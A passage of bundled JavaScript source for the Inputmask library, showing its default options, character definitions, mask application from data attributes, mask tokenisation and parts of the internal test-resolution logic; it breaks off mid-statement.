            showMaskOnHover: true,
            onKeyValidation: $.noop,
            skipOptionalPartCharacter: " ",
            numericInput: false,
            rightAlign: false,
            undoOnEscape: true,
            radixPoint: "",
            _radixDance: false,
            groupSeparator: "",
            keepStatic: null,
            positionCaretOnTab: true,
            tabThrough: false,
            supportsInputType: ["text", "tel", "password", "search"],
            ignorables: [8, 9, 13, 19, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 93, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 229],
            isComplete: null,
            preValidation: null,
            postValidation: null,
            staticDefinitionSymbol: undefined,
            jitMasking: false,
            nullable: true,
            inputEventOnly: false,
            noValuePatching: false,
            positionCaretOnClick: "lvp",
            casing: null,
            inputmode: "verbatim",
            colorMask: false,
            disablePredictiveText: false,
            importDataAttributes: true
          },
          definitions: {
            9: {
              validator: "[0-9１-９]",
              definitionSymbol: "*"
            },
            a: {
              validator: "[A-Za-zА-яЁёÀ-ÿµ]",
              definitionSymbol: "*"
            },
            "*": {
              validator: "[0-9１-９A-Za-zА-яЁёÀ-ÿµ]"
            }
          },
          aliases: {},
          masksCache: {},
          mask: function mask(elems) {
            var that = this;
            function importAttributeOptions(npt, opts, userOptions, dataAttribute) {
              if (opts.importDataAttributes === true) {
                var importOption = function importOption(option, optionData) {
                  optionData = optionData !== undefined ? optionData : npt.getAttribute(dataAttribute + "-" + option);
                  if (optionData !== null) {
                    if (typeof optionData === "string") {
                      if (option.indexOf("on") === 0) optionData = window[optionData];else if (optionData === "false") optionData = false;else if (optionData === "true") optionData = true;
                    }
                    userOptions[option] = optionData;
                  }
                };
                var attrOptions = npt.getAttribute(dataAttribute),
                  option,
                  dataoptions,
                  optionData,
                  p;
                if (attrOptions && attrOptions !== "") {
                  attrOptions = attrOptions.replace(/'/g, '"');
                  dataoptions = JSON.parse("{" + attrOptions + "}");
                }
                if (dataoptions) {
                  optionData = undefined;
                  for (p in dataoptions) {
                    if (p.toLowerCase() === "alias") {
                      optionData = dataoptions[p];
                      break;
                    }
                  }
                }
                importOption("alias", optionData);
                if (userOptions.alias) {
                  resolveAlias(userOptions.alias, userOptions, opts);
                }
                for (option in opts) {
                  if (dataoptions) {
                    optionData = undefined;
                    for (p in dataoptions) {
                      if (p.toLowerCase() === option.toLowerCase()) {
                        optionData = dataoptions[p];
                        break;
                      }
                    }
                  }
                  importOption(option, optionData);
                }
              }
              $.extend(true, opts, userOptions);
              if (npt.dir === "rtl" || opts.rightAlign) {
                npt.style.textAlign = "right";
              }
              if (npt.dir === "rtl" || opts.numericInput) {
                npt.dir = "ltr";
                npt.removeAttribute("dir");
                opts.isRTL = true;
              }
              return Object.keys(userOptions).length;
            }
            if (typeof elems === "string") {
              elems = document.getElementById(elems) || document.querySelectorAll(elems);
            }
            elems = elems.nodeName ? [elems] : elems;
            $.each(elems, function (ndx, el) {
              var scopedOpts = $.extend(true, {}, that.opts);
              if (importAttributeOptions(el, scopedOpts, $.extend(true, {}, that.userOptions), that.dataAttribute)) {
                var maskset = generateMaskSet(scopedOpts, that.noMasksCache);
                if (maskset !== undefined) {
                  if (el.inputmask !== undefined) {
                    el.inputmask.opts.autoUnmask = true;
                    el.inputmask.remove();
                  }
                  el.inputmask = new Inputmask(undefined, undefined, true);
                  el.inputmask.opts = scopedOpts;
                  el.inputmask.noMasksCache = that.noMasksCache;
                  el.inputmask.userOptions = $.extend(true, {}, that.userOptions);
                  el.inputmask.isRTL = scopedOpts.isRTL || scopedOpts.numericInput;
                  el.inputmask.el = el;
                  el.inputmask.maskset = maskset;
                  $.data(el, "_inputmask_opts", scopedOpts);
                  maskScope.call(el.inputmask, {
                    action: "mask"
                  });
                }
              }
            });
            return elems && elems[0] ? elems[0].inputmask || this : this;
          },
          option: function option(options, noremask) {
            if (typeof options === "string") {
              return this.opts[options];
            } else if ((typeof options === "undefined" ? "undefined" : _typeof(options)) === "object") {
              $.extend(this.userOptions, options);
              if (this.el && noremask !== true) {
                this.mask(this.el);
              }
              return this;
            }
          },
          unmaskedvalue: function unmaskedvalue(value) {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "unmaskedvalue",
              value: value
            });
          },
          remove: function remove() {
            return maskScope.call(this, {
              action: "remove"
            });
          },
          getemptymask: function getemptymask() {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "getemptymask"
            });
          },
          hasMaskedValue: function hasMaskedValue() {
            return !this.opts.autoUnmask;
          },
          isComplete: function isComplete() {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "isComplete"
            });
          },
          getmetadata: function getmetadata() {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "getmetadata"
            });
          },
          isValid: function isValid(value) {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "isValid",
              value: value
            });
          },
          format: function format(value, metadata) {
            this.maskset = this.maskset || generateMaskSet(this.opts, this.noMasksCache);
            return maskScope.call(this, {
              action: "format",
              value: value,
              metadata: metadata
            });
          },
          setValue: function setValue(value) {
            if (this.el) {
              $(this.el).trigger("setvalue", [value]);
            }
          },
          analyseMask: function analyseMask(mask, regexMask, opts) {
            var tokenizer = /(?:[?*+]|\{[0-9\+\*]+(?:,[0-9\+\*]*)?(?:\|[0-9\+\*]*)?\})|[^.?*+^${[]()|\\]+|./g,
              regexTokenizer = /\[\^?]?(?:[^\\\]]+|\\[\S\s]?)*]?|\\(?:0(?:[0-3][0-7]{0,2}|[4-7][0-7]?)?|[1-9][0-9]*|x[0-9A-Fa-f]{2}|u[0-9A-Fa-f]{4}|c[A-Za-z]|[\S\s]?)|\((?:\?[:=!]?)?|(?:[?*+]|\{[0-9]+(?:,[0-9]*)?\})\??|[^.?*+^${[()|\\]+|./g,
              escaped = false,
              currentToken = new MaskToken(),
              match,
              m,
              openenings = [],
              maskTokens = [],
              openingToken,
              currentOpeningToken,
              alternator,
              lastMatch,
              groupToken;
            function MaskToken(isGroup, isOptional, isQuantifier, isAlternator) {
              this.matches = [];
              this.openGroup = isGroup || false;
              this.alternatorGroup = false;
              this.isGroup = isGroup || false;
              this.isOptional = isOptional || false;
              this.isQuantifier = isQuantifier || false;
              this.isAlternator = isAlternator || false;
              this.quantifier = {
                min: 1,
                max: 1
              };
            }
            function insertTestDefinition(mtoken, element, position) {
              position = position !== undefined ? position : mtoken.matches.length;
              var prevMatch = mtoken.matches[position - 1];
              if (regexMask) {
                if (element.indexOf("[") === 0 || escaped && /\\d|\\s|\\w]/i.test(element) || element === ".") {
                  mtoken.matches.splice(position++, 0, {
                    fn: new RegExp(element, opts.casing ? "i" : ""),
                    optionality: false,
                    newBlockMarker: prevMatch === undefined ? "master" : prevMatch.def !== element,
                    casing: null,
                    def: element,
                    placeholder: undefined,
                    nativeDef: element
                  });
                } else {
                  if (escaped) element = element[element.length - 1];
                  $.each(element.split(""), function (ndx, lmnt) {
                    prevMatch = mtoken.matches[position - 1];
                    mtoken.matches.splice(position++, 0, {
                      fn: null,
                      optionality: false,
                      newBlockMarker: prevMatch === undefined ? "master" : prevMatch.def !== lmnt && prevMatch.fn !== null,
                      casing: null,
                      def: opts.staticDefinitionSymbol || lmnt,
                      placeholder: opts.staticDefinitionSymbol !== undefined ? lmnt : undefined,
                      nativeDef: (escaped ? "'" : "") + lmnt
                    });
                  });
                }
                escaped = false;
              } else {
                var maskdef = (opts.definitions ? opts.definitions[element] : undefined) || Inputmask.prototype.definitions[element];
                if (maskdef && !escaped) {
                  mtoken.matches.splice(position++, 0, {
                    fn: maskdef.validator ? typeof maskdef.validator == "string" ? new RegExp(maskdef.validator, opts.casing ? "i" : "") : new function () {
                      this.test = maskdef.validator;
                    }() : new RegExp("."),
                    optionality: false,
                    newBlockMarker: prevMatch === undefined ? "master" : prevMatch.def !== (maskdef.definitionSymbol || element),
                    casing: maskdef.casing,
                    def: maskdef.definitionSymbol || element,
                    placeholder: maskdef.placeholder,
                    nativeDef: element
                  });
                } else {
                  mtoken.matches.splice(position++, 0, {
                    fn: null,
                    optionality: false,
                    newBlockMarker: prevMatch === undefined ? "master" : prevMatch.def !== element && prevMatch.fn !== null,
                    casing: null,
                    def: opts.staticDefinitionSymbol || element,
                    placeholder: opts.staticDefinitionSymbol !== undefined ? element : undefined,
                    nativeDef: (escaped ? "'" : "") + element
                  });
                  escaped = false;
                }
              }
            }
            function verifyGroupMarker(maskToken) {
              if (maskToken && maskToken.matches) {
                $.each(maskToken.matches, function (ndx, token) {
                  var nextToken = maskToken.matches[ndx + 1];
                  if ((nextToken === undefined || nextToken.matches === undefined || nextToken.isQuantifier === false) && token && token.isGroup) {
                    token.isGroup = false;
                    if (!regexMask) {
                      insertTestDefinition(token, opts.groupmarker[0], 0);
                      if (token.openGroup !== true) {
                        insertTestDefinition(token, opts.groupmarker[1]);
                      }
                    }
                  }
                  verifyGroupMarker(token);
                });
              }
            }
            function defaultCase() {
              if (openenings.length > 0) {
                currentOpeningToken = openenings[openenings.length - 1];
                insertTestDefinition(currentOpeningToken, m);
                if (currentOpeningToken.isAlternator) {
                  alternator = openenings.pop();
                  for (var mndx = 0; mndx < alternator.matches.length; mndx++) {
                    if (alternator.matches[mndx].isGroup) alternator.matches[mndx].isGroup = false;
                  }
                  if (openenings.length > 0) {
                    currentOpeningToken = openenings[openenings.length - 1];
                    currentOpeningToken.matches.push(alternator);
                  } else {
                    currentToken.matches.push(alternator);
                  }
                }
              } else {
                insertTestDefinition(currentToken, m);
              }
            }
            function reverseTokens(maskToken) {
              function reverseStatic(st) {
                if (st === opts.optionalmarker[0]) st = opts.optionalmarker[1];else if (st === opts.optionalmarker[1]) st = opts.optionalmarker[0];else if (st === opts.groupmarker[0]) st = opts.groupmarker[1];else if (st === opts.groupmarker[1]) st = opts.groupmarker[0];
                return st;
              }
              maskToken.matches = maskToken.matches.reverse();
              for (var match in maskToken.matches) {
                if (maskToken.matches.hasOwnProperty(match)) {
                  var intMatch = parseInt(match);
                  if (maskToken.matches[match].isQuantifier && maskToken.matches[intMatch + 1] && maskToken.matches[intMatch + 1].isGroup) {
                    var qt = maskToken.matches[match];
                    maskToken.matches.splice(match, 1);
                    maskToken.matches.splice(intMatch + 1, 0, qt);
                  }
                  if (maskToken.matches[match].matches !== undefined) {
                    maskToken.matches[match] = reverseTokens(maskToken.matches[match]);
                  } else {
                    maskToken.matches[match] = reverseStatic(maskToken.matches[match]);
                  }
                }
              }
              return maskToken;
            }
            function groupify(matches) {
              var groupToken = new MaskToken(true);
              groupToken.openGroup = false;
              groupToken.matches = matches;
              return groupToken;
            }
            if (regexMask) {
              opts.optionalmarker[0] = undefined;
              opts.optionalmarker[1] = undefined;
            }
            while (match = regexMask ? regexTokenizer.exec(mask) : tokenizer.exec(mask)) {
              m = match[0];
              if (regexMask) {
                switch (m.charAt(0)) {
                  case "?":
                    m = "{0,1}";
                    break;
                  case "+":
                  case "*":
                    m = "{" + m + "}";
                    break;
                }
              }
              if (escaped) {
                defaultCase();
                continue;
              }
              switch (m.charAt(0)) {
                case "(?=":
                  break;
                case "(?!":
                  break;
                case "(?<=":
                  break;
                case "(?<!":
                  break;
                case opts.escapeChar:
                  escaped = true;
                  if (regexMask) {
                    defaultCase();
                  }
                  break;
                case opts.optionalmarker[1]:
                case opts.groupmarker[1]:
                  openingToken = openenings.pop();
                  openingToken.openGroup = false;
                  if (openingToken !== undefined) {
                    if (openenings.length > 0) {
                      currentOpeningToken = openenings[openenings.length - 1];
                      currentOpeningToken.matches.push(openingToken);
                      if (currentOpeningToken.isAlternator) {
                        alternator = openenings.pop();
                        for (var mndx = 0; mndx < alternator.matches.length; mndx++) {
                          alternator.matches[mndx].isGroup = false;
                          alternator.matches[mndx].alternatorGroup = false;
                        }
                        if (openenings.length > 0) {
                          currentOpeningToken = openenings[openenings.length - 1];
                          currentOpeningToken.matches.push(alternator);
                        } else {
                          currentToken.matches.push(alternator);
                        }
                      }
                    } else {
                      currentToken.matches.push(openingToken);
                    }
                  } else defaultCase();
                  break;
                case opts.optionalmarker[0]:
                  openenings.push(new MaskToken(false, true));
                  break;
                case opts.groupmarker[0]:
                  openenings.push(new MaskToken(true));
                  break;
                case opts.quantifiermarker[0]:
                  var quantifier = new MaskToken(false, false, true);
                  m = m.replace(/[{}]/g, "");
                  var mqj = m.split("|"),
                    mq = mqj[0].split(","),
                    mq0 = isNaN(mq[0]) ? mq[0] : parseInt(mq[0]),
                    mq1 = mq.length === 1 ? mq0 : isNaN(mq[1]) ? mq[1] : parseInt(mq[1]);
                  if (mq0 === "*" || mq0 === "+") {
                    mq0 = mq1 === "*" ? 0 : 1;
                  }
                  quantifier.quantifier = {
                    min: mq0,
                    max: mq1,
                    jit: mqj[1]
                  };
                  var matches = openenings.length > 0 ? openenings[openenings.length - 1].matches : currentToken.matches;
                  match = matches.pop();
                  if (match.isAlternator) {
                    matches.push(match);
                    matches = match.matches;
                    var groupToken = new MaskToken(true);
                    var tmpMatch = matches.pop();
                    matches.push(groupToken);
                    matches = groupToken.matches;
                    match = tmpMatch;
                  }
                  if (!match.isGroup) {
                    match = groupify([match]);
                  }
                  matches.push(match);
                  matches.push(quantifier);
                  break;
                case opts.alternatormarker:
                  var groupQuantifier = function groupQuantifier(matches) {
                    var lastMatch = matches.pop();
                    if (lastMatch.isQuantifier) {
                      lastMatch = groupify([matches.pop(), lastMatch]);
                    }
                    return lastMatch;
                  };
                  if (openenings.length > 0) {
                    currentOpeningToken = openenings[openenings.length - 1];
                    var subToken = currentOpeningToken.matches[currentOpeningToken.matches.length - 1];
                    if (currentOpeningToken.openGroup && (subToken.matches === undefined || subToken.isGroup === false && subToken.isAlternator === false)) {
                      lastMatch = openenings.pop();
                    } else {
                      lastMatch = groupQuantifier(currentOpeningToken.matches);
                    }
                  } else {
                    lastMatch = groupQuantifier(currentToken.matches);
                  }
                  if (lastMatch.isAlternator) {
                    openenings.push(lastMatch);
                  } else {
                    if (lastMatch.alternatorGroup) {
                      alternator = openenings.pop();
                      lastMatch.alternatorGroup = false;
                    } else {
                      alternator = new MaskToken(false, false, false, true);
                    }
                    alternator.matches.push(lastMatch);
                    openenings.push(alternator);
                    if (lastMatch.openGroup) {
                      lastMatch.openGroup = false;
                      var alternatorGroup = new MaskToken(true);
                      alternatorGroup.alternatorGroup = true;
                      openenings.push(alternatorGroup);
                    }
                  }
                  break;
                default:
                  defaultCase();
              }
            }
            while (openenings.length > 0) {
              openingToken = openenings.pop();
              currentToken.matches.push(openingToken);
            }
            if (currentToken.matches.length > 0) {
              verifyGroupMarker(currentToken);
              maskTokens.push(currentToken);
            }
            if (opts.numericInput || opts.isRTL) {
              reverseTokens(maskTokens[0]);
            }
            return maskTokens;
          }
        };
        Inputmask.extendDefaults = function (options) {
          $.extend(true, Inputmask.prototype.defaults, options);
        };
        Inputmask.extendDefinitions = function (definition) {
          $.extend(true, Inputmask.prototype.definitions, definition);
        };
        Inputmask.extendAliases = function (alias) {
          $.extend(true, Inputmask.prototype.aliases, alias);
        };
        Inputmask.format = function (value, options, metadata) {
          return Inputmask(options).format(value, metadata);
        };
        Inputmask.unmask = function (value, options) {
          return Inputmask(options).unmaskedvalue(value);
        };
        Inputmask.isValid = function (value, options) {
          return Inputmask(options).isValid(value);
        };
        Inputmask.remove = function (elems) {
          if (typeof elems === "string") {
            elems = document.getElementById(elems) || document.querySelectorAll(elems);
          }
          elems = elems.nodeName ? [elems] : elems;
          $.each(elems, function (ndx, el) {
            if (el.inputmask) el.inputmask.remove();
          });
        };
        Inputmask.setValue = function (elems, value) {
          if (typeof elems === "string") {
            elems = document.getElementById(elems) || document.querySelectorAll(elems);
          }
          elems = elems.nodeName ? [elems] : elems;
          $.each(elems, function (ndx, el) {
            if (el.inputmask) el.inputmask.setValue(value);else $(el).trigger("setvalue", [value]);
          });
        };
        Inputmask.escapeRegex = function (str) {
          var specials = ["/", ".", "*", "+", "?", "|", "(", ")", "[", "]", "{", "}", "\\", "$", "^"];
          return str.replace(new RegExp("(\\" + specials.join("|\\") + ")", "gim"), "\\$1");
        };
        Inputmask.keyCode = {
          BACKSPACE: 8,
          BACKSPACE_SAFARI: 127,
          DELETE: 46,
          DOWN: 40,
          END: 35,
          ENTER: 13,
          ESCAPE: 27,
          HOME: 36,
          INSERT: 45,
          LEFT: 37,
          PAGE_DOWN: 34,
          PAGE_UP: 33,
          RIGHT: 39,
          SPACE: 32,
          TAB: 9,
          UP: 38,
          X: 88,
          CONTROL: 17
        };
        Inputmask.dependencyLib = $;
        function resolveAlias(aliasStr, options, opts) {
          var aliasDefinition = Inputmask.prototype.aliases[aliasStr];
          if (aliasDefinition) {
            if (aliasDefinition.alias) resolveAlias(aliasDefinition.alias, undefined, opts);
            $.extend(true, opts, aliasDefinition);
            $.extend(true, opts, options);
            return true;
          } else if (opts.mask === null) {
            opts.mask = aliasStr;
          }
          return false;
        }
        function generateMaskSet(opts, nocache) {
          function generateMask(mask, metadata, opts) {
            var regexMask = false;
            if (mask === null || mask === "") {
              regexMask = opts.regex !== null;
              if (regexMask) {
                mask = opts.regex;
                mask = mask.replace(/^(\^)(.*)(\$)$/, "$2");
              } else {
                regexMask = true;
                mask = ".*";
              }
            }
            if (mask.length === 1 && opts.greedy === false && opts.repeat !== 0) {
              opts.placeholder = "";
            }
            if (opts.repeat > 0 || opts.repeat === "*" || opts.repeat === "+") {
              var repeatStart = opts.repeat === "*" ? 0 : opts.repeat === "+" ? 1 : opts.repeat;
              mask = opts.groupmarker[0] + mask + opts.groupmarker[1] + opts.quantifiermarker[0] + repeatStart + "," + opts.repeat + opts.quantifiermarker[1];
            }
            var masksetDefinition,
              maskdefKey = regexMask ? "regex_" + opts.regex : opts.numericInput ? mask.split("").reverse().join("") : mask;
            if (Inputmask.prototype.masksCache[maskdefKey] === undefined || nocache === true) {
              masksetDefinition = {
                mask: mask,
                maskToken: Inputmask.prototype.analyseMask(mask, regexMask, opts),
                validPositions: {},
                _buffer: undefined,
                buffer: undefined,
                tests: {},
                excludes: {},
                metadata: metadata,
                maskLength: undefined
              };
              if (nocache !== true) {
                Inputmask.prototype.masksCache[maskdefKey] = masksetDefinition;
                masksetDefinition = $.extend(true, {}, Inputmask.prototype.masksCache[maskdefKey]);
              }
            } else masksetDefinition = $.extend(true, {}, Inputmask.prototype.masksCache[maskdefKey]);
            return masksetDefinition;
          }
          var ms;
          if ($.isFunction(opts.mask)) {
            opts.mask = opts.mask(opts);
          }
          if ($.isArray(opts.mask)) {
            if (opts.mask.length > 1) {
              if (opts.keepStatic === null) {
                opts.keepStatic = "auto";
                for (var i = 0; i < opts.mask.length; i++) {
                  if (opts.mask[i].charAt(0) !== opts.mask[0].charAt(0)) {
                    opts.keepStatic = true;
                    break;
                  }
                }
              }
              var altMask = opts.groupmarker[0];
              $.each(opts.isRTL ? opts.mask.reverse() : opts.mask, function (ndx, msk) {
                if (altMask.length > 1) {
                  altMask += opts.groupmarker[1] + opts.alternatormarker + opts.groupmarker[0];
                }
                if (msk.mask !== undefined && !$.isFunction(msk.mask)) {
                  altMask += msk.mask;
                } else {
                  altMask += msk;
                }
              });
              altMask += opts.groupmarker[1];
              return generateMask(altMask, opts.mask, opts);
            } else opts.mask = opts.mask.pop();
          }
          if (opts.mask && opts.mask.mask !== undefined && !$.isFunction(opts.mask.mask)) {
            ms = generateMask(opts.mask.mask, opts.mask, opts);
          } else {
            ms = generateMask(opts.mask, opts.mask, opts);
          }
          return ms;
        }
        function isInputEventSupported(eventName) {
          var el = document.createElement("input"),
            evName = "on" + eventName,
            isSupported = evName in el;
          if (!isSupported) {
            el.setAttribute(evName, "return;");
            isSupported = typeof el[evName] === "function";
          }
          el = null;
          return isSupported;
        }
        function maskScope(actionObj, maskset, opts) {
          maskset = maskset || this.maskset;
          opts = opts || this.opts;
          var inputmask = this,
            el = this.el,
            isRTL = this.isRTL,
            undoValue,
            $el,
            skipKeyPressEvent = false,
            skipInputEvent = false,
            ignorable = false,
            maxLength,
            mouseEnter = false,
            colorMask,
            originalPlaceholder = "";
          function getMaskTemplate(baseOnInput, minimalPos, includeMode, noJit, clearOptionalTail) {
            var greedy = opts.greedy;
            if (clearOptionalTail) opts.greedy = false;
            minimalPos = minimalPos || 0;
            var maskTemplate = [],
              ndxIntlzr,
              pos = 0,
              test,
              testPos,
              lvp = getLastValidPosition();
            do {
              if (baseOnInput === true && getMaskSet().validPositions[pos]) {
                testPos = clearOptionalTail && getMaskSet().validPositions[pos].match.optionality === true && getMaskSet().validPositions[pos + 1] === undefined && (getMaskSet().validPositions[pos].generatedInput === true || getMaskSet().validPositions[pos].input == opts.skipOptionalPartCharacter && pos > 0) ? determineTestTemplate(pos, getTests(pos, ndxIntlzr, pos - 1)) : getMaskSet().validPositions[pos];
                test = testPos.match;
                ndxIntlzr = testPos.locator.slice();
                maskTemplate.push(includeMode === true ? testPos.input : includeMode === false ? test.nativeDef : getPlaceholder(pos, test));
              } else {
                testPos = getTestTemplate(pos, ndxIntlzr, pos - 1);
                test = testPos.match;
                ndxIntlzr = testPos.locator.slice();
                var jitMasking = noJit === true ? false : opts.jitMasking !== false ? opts.jitMasking : test.jit;
                if (jitMasking === false || jitMasking === undefined || typeof jitMasking === "number" && isFinite(jitMasking) && jitMasking > pos) {
                  maskTemplate.push(includeMode === false ? test.nativeDef : getPlaceholder(pos, test));
                }
              }
              if (opts.keepStatic === "auto") {
                if (test.newBlockMarker && test.fn !== null) {
                  opts.keepStatic = pos - 1;
                }
              }
              pos++;
            } while ((maxLength === undefined || pos < maxLength) && (test.fn !== null || test.def !== "") || minimalPos > pos);
            if (maskTemplate[maskTemplate.length - 1] === "") {
              maskTemplate.pop();
            }
            if (includeMode !== false || getMaskSet().maskLength === undefined) getMaskSet().maskLength = pos - 1;
            opts.greedy = greedy;
            return maskTemplate;
          }
          function getMaskSet() {
            return maskset;
          }
          function resetMaskSet(soft) {
            var maskset = getMaskSet();
            maskset.buffer = undefined;
            if (soft !== true) {
              maskset.validPositions = {};
              maskset.p = 0;
            }
          }
          function getLastValidPosition(closestTo, strict, validPositions) {
            var before = -1,
              after = -1,
              valids = validPositions || getMaskSet().validPositions;
            if (closestTo === undefined) closestTo = -1;
            for (var posNdx in valids) {
              var psNdx = parseInt(posNdx);
              if (valids[psNdx] && (strict || valids[psNdx].generatedInput !== true)) {
                if (psNdx <= closestTo) before = psNdx;
                if (psNdx >= closestTo) after = psNdx;
              }
            }
            return before === -1 || before == closestTo ? after : after == -1 ? before : closestTo - before < after - closestTo ? before : after;
          }
          function getDecisionTaker(tst) {
            var decisionTaker = tst.locator[tst.alternation];
            if (typeof decisionTaker == "string" && decisionTaker.length > 0) {
              decisionTaker = decisionTaker.split(",")[0];
            }
            return decisionTaker !== undefined ? decisionTaker.toString() : "";
          }
          function getLocator(tst, align) {
            var locator = (tst.alternation != undefined ? tst.mloc[getDecisionTaker(tst)] : tst.locator).join("");
            if (locator !== "") while (locator.length < align) {
              locator += "0";
            }
            return locator;
          }
          function determineTestTemplate(pos, tests) {
            pos = pos > 0 ? pos - 1 : 0;
            var altTest = getTest(pos),
              targetLocator = getLocator(altTest),
              tstLocator,
              closest,
              bestMatch;
            for (var ndx = 0; ndx < tests.length; ndx++) {
              var tst = tests[ndx];
              tstLocator = getLocator(tst, targetLocator.length);
              var distance = Math.abs(tstLocator - targetLocator);
              if (closest === undefined || tstLocator !== "" && distance < closest || bestMatch && bestMatch.match.optionality && bestMatch.match.newBlockMarker === "master" && (!tst.match.optionality || !tst.match.newBlockMarker) || bestMatch && bestMatch.match.optionalQuantifier && !tst.match.optionalQuantifier) {
                closest = distance;
                bestMatch = tst;
              }
            }
            return bestMatch;
          }
          function getTestTemplate(pos, ndxIntlzr, tstPs) {
            return getMaskSet().validPositions[pos] || determineTestTemplate(pos, getTests(pos, ndxIntlzr ? ndxIntlzr.slice() : ndxIntlzr, tstPs));
          }
          function getTest(pos, tests) {
            if (getMaskSet().validPositions[pos]) {
              return getMaskSet().validPositions[pos];
            }
            return (tests || getTests(pos))[0];
          }
          function positionCanMatchDefinition(pos, def) {
            var valid = false,
              tests = getTests(pos);
            for (var tndx = 0; tndx < tests.length; tndx++) {
              if (tests[tndx].match && tests[tndx].match.def === def) {
                valid = true;
                break;
              }
            }
            return valid;
          }
          function getTests(pos, ndxIntlzr, tstPs) {
            var maskTokens = getMaskSet().maskToken,
              testPos = ndxIntlzr ? tstPs : 0,
              ndxInitializer = ndxIntlzr ? ndxIntlzr.slice() : [0],
              matches = [],
              insertStop = false,
              latestMatch,
              cacheDependency = ndxIntlzr ? ndxIntlzr.join("") : "",
              offset = 0;
            function resolveTestFromToken(maskToken, ndxInitializer, loopNdx, quantifierRecurse) {
              function handleMatch(match, loopNdx, quantifierRecurse) {
                function isFirstMatch(latestMatch, tokenGroup) {
                  var firstMatch = $.inArray(latestMatch, tokenGroup.matches) === 0;
                  if (!firstMatch) {
                    $.each(tokenGroup.matches, function (ndx, match) {
                      if (match.isQuantifier === true) firstMatch = isFirstMatch(latestMatch, tokenGroup.matches[ndx - 1]);else if (match.hasOwnProperty("matches")) firstMatch = isFirstMatch(latestMatch, match);
                      if (firstMatch) return false;
                    });
                  }
                  return firstMatch;
                }
                function resolveNdxInitializer(pos, alternateNdx, targetAlternation) {
                  var bestMatch, indexPos;
                  if (getMaskSet().tests[pos] || getMaskSet().validPositions[pos]) {
                    $.each(getMaskSet().tests[pos] || [getMaskSet().validPositions[pos]], function (ndx, lmnt) {
                      if (lmnt.mloc[alternateNdx]) {
                        bestMatch = lmnt;
                        return false;
                      }
                      var alternation = targetAlternation !== undefined ? targetAlternation : lmnt.alternation,
                        ndxPos = lmnt.locator[alternation] !== undefined ? lmnt.locator[alternation].toString().indexOf(alternateNdx) : -1;
                      if ((indexPos === undefined || ndxPos < indexPos) && ndxPos !== -1) {
                        bestMatch = lmnt;
                        indexPos = ndxPos;
                      }
                    });
                  }
                  if (bestMatch) {
                    var bestMatchAltIndex = bestMatch.locator[bestMatch.alternation];
                    var locator = bestMatch.mloc[alternateNdx] || bestMatch.mloc[bestMatchAltIndex] || bestMatch.locator;
                    return locator.slice((targetAlternation !== undefined ? targetAlternation : bestMatch.alternation) + 1);
                  } else {
                    return targetAlternation !== undefined ? resolveNdxInitializer(pos, alternateNdx) : undefined;
                  }
                }
                function isSubsetOf(source, target) {
                  function expand(pattern) {
                    var expanded = [],
                      start,
                      end;
                    for (var i = 0, l = pattern.length; i < l; i++) {
                      if (pattern.charAt(i) === "-") {
                        end = pattern.charCodeAt(i + 1);
                        while (++start < end) {
                          expanded.push(String.fromCharCode(start));
                        }
                      } else {
                        start = pattern.charCodeAt(i);
                        expanded.push(pattern.charAt(i));
                      }
                    }
                    return expanded.join("");
                  }
                  if (opts.regex && source.match.fn !== null && target.match.fn !== null) {
                    return expand(target.match.def.replace(/[\[\]]/g, "")).indexOf(expand(source.match.def.replace(/[\[\]]/g, ""))) !== -1;
                  }
                  return source.match.def === target.match.nativeDef;
                }
                function staticCanMatchDefinition(source, target) {
                  var sloc = source.locator.slice(source.alternation).join(""),
                    tloc = target.locator.slice(target.alternation).join(""),
                    canMatch = sloc == tloc,
                    canMatch = canMatch && source.match.fn === null && target.match.fn !== null ? target.match.fn.test(source.match.def, getMaskSet(), pos, false, opts, false) : false;
                  return canMatch;
                }
                function setMergeLocators(targetMatch, altMatch) {
                  if (altMatch === undefined || targetMatch.alternation === altMatch.alternation && targetMatch.locator[targetMatch.alternation].toString().indexOf(altMatch.locator[altMatch.alternation]) === -1) {
                    targetMatch.mloc = targetMatch.mloc || {};
                    var locNdx = targetMatch.locator[targetMatch.alternation];
                    if (locNdx === undefined) targetMatch.alternation = undefined;else {
                      if (typeof locNdx === "string") locNdx = locNdx.split(",")[0];
                      if (targetMatch.mloc[locNdx] === undefined) targetMatch.mloc[locNdx] = targetMatch.locator.slice();
                      if (altMatch !== undefined) {
                        for (var ndx in altMatch.mloc) {
                          if (typeof ndx === "string") ndx = ndx.split(",")[0];
                          if (targetMatch.mloc[ndx] === undefined) targetMatch.mloc[ndx] = altMatch.mloc[ndx];
                        }
                        targetMatch.locator[targetMatch.alternation] = Object.keys(targetMatch.mloc).join(",");
                      }
                      return true;
                    }
                  }
                  return false;
                }
                if (testPos > 500 && quantifierRecurse !== undefined) {
                  throw "Inputmask: There is probably an error in your mask definition or in the code. Create an issue on github with an example of the mask you are using. " + getMaskSet().mask;
                }
                if (testPos === pos && match.matches === undefined) {
                  matches.push({
                    match: match,
                    locator: loopNdx.reverse(),
                    cd: cacheDependency,
                    mloc: {}
                  });
                  return true;
                } else if (match.matches !== undefined) {
                  if (match.isGroup && quantifierRecurse !== match) {
                    match = handleMatch(maskToken.matches[$.inArray(match, maskToken.matches) + 1], loopNdx, quantifierRecurse);
                    if (match) return true;
                  } else if (match.isOptional) {
                    var optionalToken = match;
                    match = resolveTestFromToken(match, ndxInitializer, loopNdx, quantifierRecurse);
                    if (match) {
                      $.each(matches, function (ndx, mtch) {
                        mtch.match.optionality = true;
                      });
                      latestMatch = matches[matches.length - 1].match;
                      if (quantifierRecurse === undefined && isFirstMatch(latestMatch, optionalToken)) {
                        insertStop = true;
                        testPos = pos;
                      } else return true;
                    }
                  } else if (match.isAlternator) {
                    var alternateToken = match,
                      malternateMatches = [],
                      maltMatches,
                      currentMatches = matches.slice(),
                      loopNdxCnt = loopNdx.length;
                    var altIndex = ndxInitializer.length > 0 ? ndxInitializer.shift() : -1;
                    if (altIndex === -1 || typeof altIndex === "string") {
                      var currentPos = testPos,
